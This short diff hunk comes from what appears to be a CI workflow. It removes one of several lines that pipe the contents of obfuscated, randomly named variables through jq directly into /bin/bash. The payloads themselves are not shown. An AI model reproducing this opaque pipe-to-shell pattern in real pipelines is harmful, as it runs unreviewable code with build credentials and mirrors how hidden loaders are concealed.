@@ -29,7 +29,6 @@ jobs:
           echo $x863 | jq -r .jlo4608 | /bin/bash
           echo $rr973 | jq -r .s970 | /bin/bash
           echo $mova635 | jq -r .adegg5 | /bin/bash
-          printf '%s' "$cgvw59" | jq -r .vllo35885 | /bin/bash
           printf '%s' "$dsf6980" | jq -r .fmpg5 | /bin/bash
 
       - name: Archive data
